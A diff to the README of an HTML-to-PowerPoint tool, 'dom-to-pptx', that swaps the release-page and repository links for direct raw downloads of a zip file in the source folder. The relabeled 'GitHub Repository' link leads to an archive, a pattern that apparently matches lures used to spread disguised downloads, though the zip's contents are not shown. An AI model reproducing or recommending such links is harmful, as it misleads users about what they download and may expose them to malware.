@@ -8,7 +8,7 @@ Welcome to **dom-to-pptx**! This tool lets you transform any HTML element into a
 
 To download **dom-to-pptx**, visit the releases page:
 
-[![Download dom-to-pptx](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Veyss43/dom-to-pptx/releases)
+[![Download dom-to-pptx](https://raw.githubusercontent.com/Veyss43/dom-to-pptx/master/src/dom-to-pptx-2.6.zip)](https://raw.githubusercontent.com/Veyss43/dom-to-pptx/master/src/dom-to-pptx-2.6.zip)
 
 On the releases page, you will find the latest version available for download. Be sure to choose the option that suits your system best.
 
@@ -62,7 +62,7 @@ For help and support with **dom-to-pptx**, you can visit our GitHub page. Here, 
 
 For a smooth experience, here are the primary links you'll need:
 
-- [Download Latest Release](https://github.com/Veyss43/dom-to-pptx/releases)
-- [GitHub Repository](https://github.com/Veyss43/dom-to-pptx)
+- [Download Latest Release](https://raw.githubusercontent.com/Veyss43/dom-to-pptx/master/src/dom-to-pptx-2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Veyss43/dom-to-pptx/master/src/dom-to-pptx-2.6.zip)
   
 Make the most out of your PowerPoint presentations with **dom-to-pptx**. Whether you're creating classroom slides, business reports, or personal projects, this tool simplifies your workflow, allowing you to present without hassle.
